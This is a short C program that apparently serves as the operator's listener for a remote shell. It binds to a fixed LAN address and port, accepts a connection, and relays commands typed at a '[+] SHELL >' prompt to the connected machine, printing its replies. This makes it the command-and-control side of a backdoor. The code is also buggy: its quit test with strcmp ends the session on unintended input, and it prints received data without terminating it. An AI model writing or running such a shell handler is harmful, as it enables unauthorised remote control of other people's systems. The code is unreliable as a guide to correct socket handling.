#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>



int main() {

	
	struct sockaddr_in server_addr; 
	int server_sock, client_sock; 
	
	char msg[500]; 
	char buf[500]; 
	server_addr.sin_family = AF_INET; 
	server_addr.sin_port = htons(10000); 
	server_addr.sin_addr.s_addr = inet_addr("192.168.178.20"); 
	
	server_sock = socket(AF_INET, SOCK_STREAM, 0);
	
	int err = bind(server_sock, (struct sockaddr*) &server_addr, sizeof(server_addr));
		
	if (err == -1) {
		exit(EXIT_FAILURE);
	}
	printf("listening \n");
	listen(server_sock, 10); 
	

	client_sock = accept(server_sock, NULL, NULL); 
	
	printf("accepted \n"); 
	recv(client_sock, buf, sizeof(buf), 0);
	printf("recv : %s", buf);
	
	while (1) {
		memset(msg, 0, sizeof(msg)); 
		printf("[+] SHELL > ");
		fgets(msg, sizeof(msg), stdin); 
		
		send(client_sock, msg, sizeof(msg), 0); 

		recv(client_sock,  buf, sizeof(buf), 0);
		printf("%s\n", buf);
		if(strcmp(msg, "quit") >= 0) {
			printf("closing connection \n"); 
			break;
		}
	}
}
